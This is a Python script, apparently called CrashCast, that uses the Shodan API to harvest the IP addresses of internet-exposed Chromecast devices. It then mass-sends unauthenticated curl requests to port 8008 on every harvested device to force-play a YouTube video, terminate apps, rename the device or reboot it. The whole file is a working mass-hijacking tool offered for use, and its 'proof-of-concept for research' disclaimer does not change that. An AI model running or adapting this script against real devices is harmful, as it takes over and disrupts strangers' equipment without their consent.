#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''
           ██████╗██████╗  █████╗ ███████╗██╗  ██╗ ██████╗ █████╗ ███████╗████████╗
          ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝╚══██╔══╝
          ██║     ██████╔╝███████║███████╗███████║██║     ███████║███████╗   ██║   
          ██║     ██╔══██╗██╔══██║╚════██║██╔══██║██║     ██╔══██║╚════██║   ██║   
          ╚██████╗██║  ██║██║  ██║███████║██║  ██║╚██████╗██║  ██║███████║   ██║   
           ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   

                                        Author: @037
                                        Version: 2.0

####################################### DISCLAIMER ########################################
| ChrashCast is a tool that allows you to use Shodan.io to obtain thousands of vulnerable |
| Chromecast devices. It then allows you to use the same devices to mass-play any video   |
| you like, reboot device, set new device name, and terminate apps. It uses a simple cURL |
| command to execute the specified command on all the vulnerable Chromecast devices. This |
| exploit only works because people decided it would be a good idea to leave their device |
| exposed to the entire internet. Think again.                                            |
######################################### WARNING #########################################
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
| Use this tool at your own risk, it is meant to ONLY be a proof-of-concept for research. | 
###########################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./chromecast.txt")
        query = input("[*] Use Shodan API to search for affected Chromecast devices? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('product:chromecast')
            print('[✓] API Key Authentication: SUCCESS')
            print('[~] Number of Chromecast devices: %s' % results['total'])
            print('')
            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('chromecast.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[~] File written: ./chromecast.txt')
                print('')
                file2.close()
        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('chromecast.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Error: No Chromecast devices stored locally, chromecast.txt file not found!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('####################################### CHOICES ########################################')
            print('| 1. Mass-play YouTube video: Unreliable, may not work. Only requires YT video ID.     |')
            print('| 2. Close YouTube app: Will terminate YouTube process.                                |')
            print('| 3. Rename Chromecast Device: Will reassign new defined SSID name for device.         |')
            print('| 4. Kill Chromecast Process: Will stop Chromecast home screen.                        |')
            print('| 5. Reboot Chromecast: Will simply cause Chromecast to reboot.                        |')
            print('########################################################################################')
            option = int(input("[*] Select option (1-5): "))
            print('')
            if not (1 <= option <= 5):
                raise ValueError()
            if (option == 1):
                video = input("[▸] Enter YouTube video ID to mass-play (the string after v=): ") or "oHg5SJYRHA0"
            elif (option == 3):
                name = input("[▸] Enter new Chromecast device name to broadcast: ") or "Chromecast_exposed_to_entire_Internet"
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the Chromecast devices from Shodan? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Chromecast device (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the Chromecast devices stored locally? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Chromecast device (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            if (option == 1):
                engage = input('[*] Ready to mass-play YouTube video (%s)? <y/N>: ' % video).lower()
            elif (option == 2):
                engage = input('[*] Ready to terminate the YouTube app from Chromecast device(s)? <y/N>').lower()
            elif (option == 3):
                engage = input('[*] Ready to rename Chromecast device(s) name to: %s? <y/N>: ' % name).lower()
            elif (option == 4):
                engage = input('[*] Ready to terminate Chromecast process from device(s)? <y/N>: ').lower()
            elif (option == 5):
                engage = input('[*] Ready to reboot Chromecast device(s)? <y/N>: ').lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if (option == 1):
                            print('[+] Sending play video command to Chromecast (%s)' % (i))
                            with suppress_stdout():
                                os.popen('curl -H "Content-Type: application/json" http://%s:8008/apps/YouTube -X POST -d "v=%s"' % (i, video))
                        elif (option == 2):
                            print('[+] Sending terminate YouTube command to Chromecast (%s)' % (i))
                            with suppress_stdout():
                                os.popen('curl -H "Content-Type: application/json" http://%s:8008/apps/YouTube -X DELETE' % (i))
                        elif (option == 3):
                            print('[+] Sending rename device command to Chromecast (%s)' % (i))
                            with suppress_stdout():
                                os.popen('curl -Lv -H "Content-Type: application/json" --data-raw \'{"name":"%s"}\' http://%s:8008/setup/set_eureka_info' % (name, i))
                        elif (option == 4):
                            print('[+] Sending terminate Chromecast command to Chromecast (%s)' % (i))
                            with suppress_stdout():
                                os.popen('curl -X DELETE http://%s:8008/ChromeCast' % (i))
                        elif (option == 5):
                            print('[+] Sending reboot device command to Chromecast (%s)' % (i))
                            with suppress_stdout():
                                os.popen('curl -H "Content-Type: application/json" http://%s:8008/setup/reboot -d \'{"params":"now"}\' -X POST' % (i))
                else:
                    for result in results['matches']:
                        if (option == 1):
                            print('[+] Sending play video command to Chromecast (%s)' % (result['ip_str']))
                            with suppress_stdout():
                                os.popen('curl -H "Content-Type: application/json" http://%s:8008/apps/YouTube -X POST -d "v=%s"' % (result['ip_str'], video))
                        elif (option == 2):
                            print('[+] Sending terminate YouTube command to Chromecast (%s)' % (result['ip_str']))
                            with suppress_stdout():
                                os.popen('curl -H "Content-Type: application/json" http://%s:8008/apps/YouTube -X DELETE' % (result['ip_str']))
                        elif (option == 3):
                            print('[+] Sending rename device command to Chromecast (%s)' % (result['ip_str']))
                            with suppress_stdout():
                                os.popen('curl -Lv -H "Content-Type: application/json" --data-raw \'{"name":"%s"}\' http://%s:8008/setup/set_eureka_info' % (name, result['ip_str']))
                        elif (option == 4):
                            print('[+] Sending terminate Chromecast command to Chromecast (%s)' % (result['ip_str']))
                            with suppress_stdout():
                                os.popen('curl -X DELETE http://%s:8008/ChromeCast' % (result['ip_str']))
                        elif (option == 5):
                            print('[+] Sending reboot device command to Chromecast (%s)' % (result['ip_str']))
                            with suppress_stdout():
                                os.popen('curl -H "Content-Type: application/json" http://%s:8008/setup/reboot -d \'{"params":"now"}\' -X POST' % (result['ip_str']))
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: video (%s) not mass-played!' % video)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No Chromecast devices stored locally or remotely from Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break
    except ValueError:
            print("[*] WARNING: Invalid Option %d! (1-5)" % option)
            print("")